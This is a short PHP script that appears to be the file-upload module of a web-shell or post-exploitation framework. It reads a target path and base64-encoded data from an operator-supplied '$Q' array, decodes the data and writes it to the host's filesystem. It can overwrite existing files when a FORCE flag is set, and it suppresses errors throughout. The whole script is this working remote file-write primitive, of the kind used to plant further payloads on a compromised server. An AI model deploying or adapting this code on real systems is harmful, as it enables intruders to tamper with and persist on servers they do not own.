<?

!import(fileAccess)

$target = $Q['TARGET'];

if ((@fileperms($target) & 0x4000) == 0x4000){
    $dirname = (substr($target,-1) == $Q['SEPARATOR']) ? $target : $target.$Q['SEPARATOR'];
    $target  = $dirname.$Q['NAME'];}

if (@file_exists($target)){
    if ((@fileperms($target) & 0x8000) == 0x8000){
        if (fileAccess($target,'w')){
            if ($Q['FORCE']){
                if ($h = @fopen($target,'w')){
                    $content = base64_decode($Q['DATA']);
                    @fwrite($h,$content);
                    @fclose($h);
                    return array('ok',$target);}
                else return error('nowrite',$target);}
            else return array('exists',$target);}
        else return error('nowrite',$target);}
    else return error('notafile',$target);}
else{
    if ($h = @fopen($target,'w')){
        $content = base64_decode($Q['DATA']);
        @fwrite($h,$content);
        @fclose($h);
        return array('ok',$target);}
    else{
        $dirname = substr($target,0,strrpos($target,$Q['SEPARATOR'])+1);
        if ((@fileperms($dirname) & 0x4000) == 0x4000) return error('nowrite',$target);
        else return error('noexists',$target);}}

?>
